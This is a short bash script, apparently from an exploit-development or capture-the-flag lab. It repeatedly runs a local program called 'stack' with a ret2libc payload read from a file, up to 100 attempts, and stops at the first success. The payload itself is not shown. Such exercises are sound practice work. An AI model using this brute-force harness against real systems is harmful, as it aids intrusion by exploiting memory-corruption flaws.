#!/bin/bash
count=0
while [ $count -lt 100 ]; do
    echo "Attempt $((count + 1))"
    timeout 1 ./stack "$(cat /workspace/ret2libc_payload.bin)" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "SUCCESS on attempt $((count + 1))!"
        break
    fi
    count=$((count + 1))
done
echo "Completed $count attempts"
